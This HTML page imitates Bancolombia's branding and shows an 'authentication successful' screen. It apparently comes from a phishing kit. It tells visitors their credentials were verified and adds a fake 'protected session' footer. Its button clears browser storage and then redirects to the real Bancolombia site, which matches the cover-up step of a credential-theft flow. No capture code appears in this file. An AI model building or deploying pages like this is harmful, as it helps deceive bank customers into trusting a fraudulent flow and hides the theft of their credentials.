<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación Exitosa | Bancolombia</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: "Open Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            
            background-color: #FAFAFA;
            background-image: url('img/fondo.svg'); 
            background-size: cover; 
            background-position: center top;
            background-attachment: fixed;
            background-repeat: no-repeat;
            
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #2C2A29;
            padding: 24px 16px;
        }

        /* Encabezado */
        .header-container {
            text-align: center;
            margin-bottom: 24px;
        }

        .header-container img.logo {
            height: 60px;
            object-fit: contain;
        }

        /* Contenedor Principal */
        .main-wrapper {
            width: 100%;
            max-width: 480px;
        }

        /* Tarjeta de Éxito */
        .success-card {
            background-color: #FFFFFF;
            border-radius: 12px;
            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.08), 0 4px 12px rgba(0, 0, 0, 0.04);
            padding: 42px 36px;
            text-align: center;
            position: relative;
        }

        /* Check Verde Animado */
        .checkmark-wrapper {
            width: 90px;
            height: 90px;
            margin: 0 auto 24px auto;
            position: relative;
        }

        .checkmark-svg {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            display: block;
            stroke-width: 3;
            stroke: #2E7D32;
            stroke-miterlimit: 10;
            box-shadow: inset 0px 0px 0px #4CAF50;
            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
        }

        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 3;
            stroke-miterlimit: 10;
            stroke: #4CAF50;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            stroke: #FFFFFF;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }

        @keyframes stroke {
            100% {
                stroke-dashoffset: 0;
            }
        }

        @keyframes scale {
            0%, 100% {
                transform: none;
            }
            50% {
                transform: scale3d(1.1, 1.1, 1);
            }
        }

        @keyframes fill {
            100% {
                box-shadow: inset 0px 0px 0px 50px #2E7D32;
            }
        }

        .success-title {
            font-size: 23px;
            font-weight: 800;
            color: #2C2A29;
            margin-bottom: 10px;
            letter-spacing: -0.3px;
        }

        .success-subtitle {
            font-size: 14.5px;
            color: #666666;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        /* Detalle / Info Box */
        .info-box {
            background-color: #F8F9FA;
            border: 1px solid #E9ECEF;
            border-radius: 8px;
            padding: 18px 20px;
            margin-bottom: 28px;
            text-align: left;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 7px 0;
            font-size: 13.5px;
            border-bottom: 1px dashed #DEE2E6;
        }

        .info-row:last-child {
            border-bottom: none;
            padding-bottom: 0;
        }

        .info-row:first-child {
            padding-top: 0;
        }

        .info-label {
            color: #6C757D;
            font-weight: 600;
        }

        .info-value {
            color: #2C2A29;
            font-weight: 700;
        }

        .badge-success {
            background-color: #E8F5E9;
            color: #2E7D32;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 700;
            display: inline-block;
        }

        /* Botón Amarillo Bancolombia */
        .btn-finish {
            width: 100%;
            background-color: #FDDA24;
            color: #2C2A29;
            border: none;
            border-radius: 28px;
            padding: 15px 24px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
        }

        .btn-finish:hover {
            background-color: #F4CE14;
        }

        .btn-finish:active {
            transform: scale(0.98);
        }

        /* Footer de Seguridad */
        .security-footer {
            margin-top: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 12.5px;
            color: #757575;
        }

        .security-footer svg {
            width: 16px;
            height: 16px;
            fill: #757575;
            flex-shrink: 0;
        }

        @media (max-width: 480px) {
            .success-card {
                padding: 34px 22px;
            }
            .success-title {
                font-size: 21px;
            }
            .success-subtitle {
                font-size: 13.5px;
            }
        }
    </style>
</head>
<body>

    <div class="header-container">
        <img src="img/logo.svg" alt="Bancolombia" class="logo">
    </div>

    <div class="main-wrapper">
        <div class="success-card">
            
            <!-- Check Verde Animado -->
            <div class="checkmark-wrapper">
                <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                    <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
                    <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                </svg>
            </div>

            <h1 class="success-title">¡Autenticación Exitosa!</h1>
            <p class="success-subtitle">
                Tu identidad y credenciales han sido verificadas correctamente. El proceso se ha completado con éxito.
            </p>

            <!-- Resumen Informativo -->
            <div class="info-box">
                <div class="info-row">
                    <span class="info-label">Estado de validación:</span>
                    <span class="badge-success">✓ Aprobado</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Canal:</span>
                    <span class="info-value">Sucursal Virtual</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Fecha:</span>
                    <span class="info-value" id="current-date">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Hora:</span>
                    <span class="info-value" id="current-time">--</span>
                </div>
            </div>

            <button class="btn-finish" onclick="finalizarProceso()">
                <span>Finalizar y Salir</span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M9 18l6-6-6-6"/>
                </svg>
            </button>

        </div>

        <div class="security-footer">
            <svg viewBox="0 0 24 24">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Sesión protegida con cifrado de seguridad Bancolombia</span>
        </div>
    </div>

    <script>
        // Actualizar Fecha y Hora en tiempo real
        function updateDateTime() {
            const now = new Date();
            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            const dateStr = now.toLocaleDateString('es-CO', options);
            const formattedDate = dateStr.charAt(0).toUpperCase() + dateStr.slice(1);
            
            const timeStr = now.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });

            const elDate = document.getElementById('current-date');
            const elTime = document.getElementById('current-time');
            if (elDate) elDate.textContent = formattedDate;
            if (elTime) elTime.textContent = timeStr;
        }

        updateDateTime();

        function finalizarProceso() {
            try {
                localStorage.clear();
                sessionStorage.clear();
            } catch (_) {}
            window.location.href = 'https://www.bancolombia.com/personas';
        }
    </script>
</body>
</html>
